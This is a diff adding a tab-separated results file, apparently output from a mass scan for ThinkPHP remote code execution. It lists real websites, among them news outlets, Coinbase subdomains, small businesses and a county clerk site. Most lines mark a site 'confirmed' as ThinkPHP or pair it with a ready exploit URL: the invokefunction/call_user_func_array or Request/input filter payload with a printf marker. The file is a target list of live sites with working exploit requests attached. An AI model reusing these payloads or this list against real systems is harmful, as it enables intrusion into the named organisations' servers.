@@ -1,0 +1,107 @@
+TP	alawyerskitchen.com	confirmed
+RCE	baohiemlibertyvn.com	invokefunction	http://baohiemlibertyvn.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	besson-tools.com	confirmed
+RCE	bl.thgim.com	invokefunction	https://www.thehindubusinessline.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	blog.coinbase.com	invokefunction	https://www.coinbase.com/blog?function=call_user_func_array&s=/index/\think\app/invokefunction&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	182he.com	confirmed
+TP	a5589a.com	confirmed
+TP	814145.com	confirmed
+TP	616109.com	confirmed
+TP	218t.com	confirmed
+TP	bifa8.net	confirmed
+TP	ceieac.com	confirmed
+TP	blockchainlunatics.com	confirmed
+RCE	capaenerji.com	invokefunction	https://capaenerji.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	developers.coinbase.com	invokefunction	https://www.coinbase.com/developer-platform?function=call_user_func_array&s=/index/\think\app/invokefunction&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	fangbocn.com	confirmed
+TP	cimaworld.com	confirmed
+TP	emiratisation.org	confirmed
+TP	cb850.com	confirmed
+RCE	fl.thgim.com	invokefunction	https://frontline.thehindu.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	fangfaxian.net	confirmed
+TP	de0s.com	confirmed
+RCE	feissihair.com	invokefunction	https://feissihair.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	gogalora.com	invokefunction	https://gogalora.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	exch88.com	confirmed
+TP	global-voice.net	confirmed
+RCE	huertasconsulting.com	invokefunction	https://huertasconsulting.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	inyalearning.com	invokefunction	http://inyalearning.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	hullandco-texas.com	invokefunction	http://hullandco-texas.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	korakpokorak.com	confirmed
+RCE	mail.cagdasspormerkezi.com	invokefunction	https://mail.cagdasyazilim.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	kenicable.com	confirmed
+RCE	minorityhealthstl.org	invokefunction	https://minorityhealthstl.org/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	mail.roycerolls.net	invokefunction	https://mail.roycerolls.net/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	pharmatraders.com	invokefunction	https://pharmatraders.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	primebroker.coinbase.com	invokefunction	https://www.coinbase.com/prime?function=call_user_func_array&s=/index/\think\app/invokefunction&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	nmrv050gearbox.top	invokefunction	http://nmrv050gearbox.top/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	redmondoregonrotary.com	invokefunction	https://redmondoregonrotary.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	mujeresontop.com	confirmed
+TP	redondobeachartgroup.org	confirmed
+RCE	ss.thgim.com	invokefunction	https://sportstar.thehindu.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	shawneecycle.com	invokefunction	https://shawneecycle.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	status.coinbase.com	confirmed
+TP	status.quadpay.com	confirmed
+TP	sthcjx.com	confirmed
+RCE	th.thgim.com	invokefunction	https://www.thehindu.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	nongbo.cc	confirmed
+TP	sneakatomic.com	confirmed
+TP	tb16888.com	confirmed
+TP	webmail.villasbytekoa.com	confirmed
+TP	wokstarrestaurant.com	confirmed
+TP	www.besson-tools.com	confirmed
+RCE	www.baohiemlibertyvn.com	invokefunction	http://www.baohiemlibertyvn.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	tube-8com.com	confirmed
+RCE	www.anuviewwindowcleaning.com	invokefunction	https://anuviewwindowcleaning.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.capaenerji.com	invokefunction	https://www.capaenerji.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	www.emiratisation.org	confirmed
+RCE	www.es.skechers.com	input-filter	https://www.skechers.es/index.php?s=index/\think\Request/input&filter[]=printf&data=tprce_mark_8842
+TP	www.cimaworld.com	confirmed
+RCE	www.gwforkliftthai.com	invokefunction	https://multixthailand.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.housemorningwood.com	invokefunction	https://www.housemorningwood.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.jp.skechers.com	input-filter	https://www.skechers.jp/index.php?s=index/\think\Request/input&filter[]=printf&data=tprce_mark_8842
+RCE	www.malikpodiatry.com	invokefunction	https://malikpodiatry.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.magicalshoes24.com	invokefunction	https://magicalshoes24.com/en/?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B0%5D=%25stprce_mark_8842&SubmitCurrency=1&id_currency=2
+TP	www.wokstarrestaurant.com	confirmed
+TP	www.thefolkes.com	confirmed
+RCE	dezpad.com	invokefunction	http://dezpad.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	dev.dottedsolutions.com	invokefunction	https://powercleanandsupplies.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	yepom.com	input-filter	https://shop119849753.world.taobao.com/index.php?s=index/\think\Request/input&filter[]=printf&data=tprce_mark_8842
+RCE	ethoca.coinbase.com	invokefunction	https://www.coinbase.com/?function=call_user_func_array&s=/index/\think\app/invokefunction&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	gulfrecliners.com	invokefunction	http://gulfrecliners.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	impermeabilizantes.seowebmx.com	invokefunction	http://impermeabilizantes.seowebmx.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	mylifeworksrehab.com	invokefunction	https://mylifeworksrehab.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	indso.com	invokefunction	https://indso.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	pairodicetattoos.com	invokefunction	http://pairodicetattoos.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	recit.org	invokefunction	http://recit.org/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	portlandvelo.net	invokefunction	http://portlandvelo.net/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	nokeweir.com	confirmed
+RCE	sextoyscenter.net	invokefunction	https://sextoyscenter.net/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.centurylandscaping.com	invokefunction	http://www.centurylandscaping.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.garagedoorsrepaircanyoncountry.com	invokefunction	https://www.garagedoorsrepaircanyoncountry.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.jailbreakbrewing.com	invokefunction	https://www.jailbreakbrewing.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.pairodicetattoos.com	invokefunction	http://www.pairodicetattoos.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.thietkebepsaigon.com	invokefunction	http://www.thietkebepsaigon.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	status.brightpearl.com	confirmed
+RCE	www.indso.com	invokefunction	https://www.indso.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	x-libris.xf-redux.com	invokefunction	https://x-libris.xf-redux.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	xzhengyuan.com	confirmed
+TP	alia-b.com	confirmed
+TP	cuselaser.com	confirmed
+RCE	cadiandagroup.com	invokefunction	http://cadiandagroup.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	countyclerk.mctx.org	confirmed
+RCE	capandmore.com	invokefunction	http://cappsbaby.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	gem88.com	invokefunction	https://gem88.llc/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	imopalheiro.com	invokefunction	https://imopalheiro.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	korfunet.com	invokefunction	https://korfunet.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	mctx.org	confirmed
+RCE	occhialevintage.com	invokefunction	https://occhialevintage.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	redcap.com	confirmed
+RCE	samarthagroup.com	invokefunction	https://samarthagroup.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	tijarahub.com	invokefunction	https://tijarahub.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	stensland.net	invokefunction	http://stensland.net/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	twelectrical.com	invokefunction	http://twelectrical.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.gem88.com	invokefunction	https://gem88.llc/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+RCE	www.imopalheiro.com	invokefunction	https://www.imopalheiro.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+TP	yk64.com	confirmed
+TP	0792ysyc.com	confirmed
